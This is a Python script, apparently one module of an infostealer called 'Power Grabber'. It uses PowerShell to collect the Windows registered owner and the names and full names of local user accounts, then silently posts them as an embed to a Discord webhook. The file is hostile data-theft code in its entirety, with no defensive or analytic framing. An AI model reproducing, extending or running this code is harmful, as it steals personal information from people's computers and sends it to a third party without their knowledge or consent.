import subprocess
import requests
import json
def get_windows_info():
    try:
        owner_result = subprocess.run(
            ["powershell", "-Command", "(Get-ComputerInfo).WindowsRegisteredOwner"],
            capture_output=True, text=True, check=True
        )
        owner = owner_result.stdout.strip()
        
        user_info_result = subprocess.run(
            ["powershell", "-Command", "Get-WmiObject -Class Win32_UserAccount | Select-Object Name, FullName"],
            capture_output=True, text=True, check=True
        )
        user_info = user_info_result.stdout.strip().split('\n')
        
        users = []
        for user in user_info:
            if user.strip() and "----" not in user and "--------" not in user:
                parts = user.split()
                name = parts[0]
                full_name = ' '.join(parts[1:])
                users.append((name, full_name))
                
        return owner, users
    except subprocess.CalledProcessError as e:
        return None, None
def send_webhook(owner, users):
    embed = {
        "username": "Power Grabber",
        "avatar_url": "https://github.com/Powercascade/Power-grabber/blob/main/Power%20Grabber.png?raw=true",
        "embeds": [
            {
                "title": "User Info",
                "color": 0x8b0000,
                "fields": [
                    {
                        "name": "Windows Registered Owner",
                        "value": owner,
                        "inline": False
                    }
                ]
            }
        ]
    }
    for name, full_name in users:
        embed["embeds"][0]["fields"].append({
            "name": f"User Name: {name}",
            "value": full_name,
            "inline": False
        })
    response = requests.post(
        webhook_url, 
        data=json.dumps(embed), 
        headers={"Content-Type": "application/json"}
    )
    if response.status_code == 204:
        pass
    else:
        print(f"Failed to send data. Status code: {response.status_code}")
owner, users = get_windows_info()
if owner and users:
    send_webhook(owner, users)
else:
    pass
